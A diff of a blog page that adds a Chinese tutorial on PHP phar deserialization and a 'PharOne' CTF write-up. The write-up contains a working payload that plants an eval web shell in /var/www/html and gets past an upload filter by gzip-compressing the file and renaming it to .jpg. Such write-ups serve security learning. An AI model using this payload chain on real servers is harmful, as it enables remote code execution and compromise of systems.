@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en-us">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     <title>反序列化学习 | Bubble&#39;s blog</title>
 
     <meta charset="utf-8">
@@ -81,13 +81,13 @@
           ·
         </span>
         <span>
-          1312 words
+          2345 words
         </span>
         <span class="split">
           ·
         </span>
         <span>
-          3 minute read
+          5 minute read
         </span>
     </div>
 
@@ -306,6 +306,115 @@
 <p>成功得到flag:</p>
 <p><p class="markdown-image">
   <img src="/img/24.png" alt="alt text"  />
+</p></p>
+<p><strong>phar伪协议触发php反序列化</strong></p>
+<ol>
+<li>phar文件格式</li>
+</ol>
+<p>phar（PHP Archive）是一种PHP的打包文件格式，它允许将多个PHP文件和其他资源（如图像、样式表等）打包成一个归档文件，类似于Java的jar包。phar文件主要由以下四部分组成：</p>
+<ul>
+<li>
+<p>stub：phar文件的标志，通常以<code>&lt;?php __HALT_COMPILER(); ?&gt;</code>结尾，这是识别phar文件的关键。</p>
+</li>
+<li>
+<p>manifest：存储被压缩文件的属性等信息，这些信息以序列化的形式存储，这是漏洞利用的核心。</p>
+</li>
+<li>
+<p>content：被压缩文件的内容。</p>
+</li>
+<li>
+<p>signature（可选）：签名，放在文件末尾。</p>
+</li>
+</ul>
+<ol start="2">
+<li>反序列化漏洞的产生</li>
+</ol>
+<p>在PHP中，phar文件的metadata（即manifest部分）以序列化的形式存储。当PHP的文件操作函数（如<code>file_get_contents(), include(), require()</code>等）通过<code>phar://伪协议</code>解析phar文件时，会自动触发对manifest字段的序列化字符串进行反序列化操作。如果这些序列化字符串中包含了恶意构造的对象或数据，就可能导致安全漏洞。</p>
+<p>生成phar文件的代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#080;font-style:italic">//实例一个phar对象供后续操作
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span><span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//反序列化payload构造
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">TestObject</span> {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#666">@</span>unlink(<span style="color:#b44">&#34;phar.phar&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//实例一个phar对象供后续操作，后缀名必须为phar
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$phar</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Phar(<span style="color:#b44">&#34;phar.phar&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//开始缓冲对phar的写操作 
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">startBuffering</span>();
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//设置识别phar拓展的标识stub，必须以 __HALT_COMPILER(); ?&gt; 结尾
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">setStub</span>(<span style="color:#b44">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span>); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//将反序列化的对象放入该文件中
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$o</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> TestObject();
+</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$o</span><span style="color:#666">-&gt;</span><span style="color:#b44">data</span><span style="color:#666">=</span><span style="color:#b44">&#39;i am bmjoker&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//将自定义的归档元数据meta-data存入manifest
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">setMetadata</span>(<span style="color:#b8860b">$o</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//phar本质上是个压缩包，所以要添加压缩的文件和文件内容
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">addFromString</span>(<span style="color:#b44">&#34;test.txt&#34;</span>, <span style="color:#b44">&#34;bmjoker&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//停止缓冲对phar的写操作
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">stopBuffering</span>();
+</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
+</span></span></span></code></pre></div><p>注意:本地生成一个phar文件，要想使用Phar类里的方法，必须将php.ini文件中的<code>phar.readonly</code>配置项配置为0或Off</p>
+<p><strong>PharOne</strong></p>
+<p>开启环境发现了文件上传页面
+<p class="markdown-image">
+  <img src="/img/31.png" alt="alt text"  />
+</p></p>
+<p>查看页面源代码发现class.php,于是访问得到以下代码：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span>highlight_file(<span style="color:#800">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Flag</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$cmd</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __destruct() {
+</span></span><span style="display:flex;"><span>        <span style="color:#666">@</span>exec(<span style="color:#b8860b">$this</span><span style="color:#666">-</span>cmd);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#666">@</span>unlink(<span style="color:#b8860b">$_POST</span>[<span style="color:#b44">&#39;file&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
+</span></span></span></code></pre></div><p>文件上传考虑phar反序列化，构造以下payload：</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Flag</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$cmd</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span><span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> Flag();
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span><span style="color:#666">-&gt;</span><span style="color:#b44">cmd</span><span style="color:#666">=</span><span style="color:#b44">&#34;echo </span><span style="color:#b62;font-weight:bold">\&#34;</span><span style="color:#b44">&lt;?=@eval(</span><span style="color:#b62;font-weight:bold">\\\$</span><span style="color:#b44">_POST[&#39;a&#39;]);</span><span style="color:#b62;font-weight:bold">\&#34;</span><span style="color:#b44">&gt;/var/www/html/1.php&#34;</span>; <span style="color:#080;font-style:italic">//将eval执行的内容写入1.php
+</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span><span style="color:#b8860b">$phar</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Phar(<span style="color:#b44">&#34;test.phar&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">startBuffering</span>();
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">setStub</span>(<span style="color:#b44">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">setMetadata</span>(<span style="color:#b8860b">$a</span>);
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">addFromString</span>(<span style="color:#b44">&#34;test.txt&#34;</span>, <span style="color:#b44">&#34;test&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">stopBuffering</span>();
+</span></span></code></pre></div><p>运行php代码后可以在目录下看到生成的phar文件
+<p class="markdown-image">
+  <img src="/img/33.png" alt="alt text"  />
+</p></p>
+<p>将该phar文件上传发现无回显，修改后缀为jpg后出现正则匹配
+<p class="markdown-image">
+  <img src="/img/32.png" alt="alt text"  />
+</p></p>
+<p>利用gzip命令压缩绕过
+<p class="markdown-image">
+  <img src="/img/35.png" alt="alt text"  />
+</p></p>
+<p>压缩后将生成的test.phar.gz重命名为test.jpg再上传就能得到：
+<p class="markdown-image">
+  <img src="/img/34.png" alt="alt text"  />
+</p></p>
+<p>那么就可以通过phar伪协议post：
+<p class="markdown-image">
+  <img src="/img/36.png" alt="alt text"  />
+</p></p>
+<p>上传成功后访问刚刚的1.php,通过a来写系统命令:
+<p class="markdown-image">
+  <img src="/img/37.png" alt="alt text"  />
+</p></p>
+<p>得到flag:
+<p class="markdown-image">
+  <img src="/img/38.png" alt="alt text"  />
 </p></p>
     </div>
 
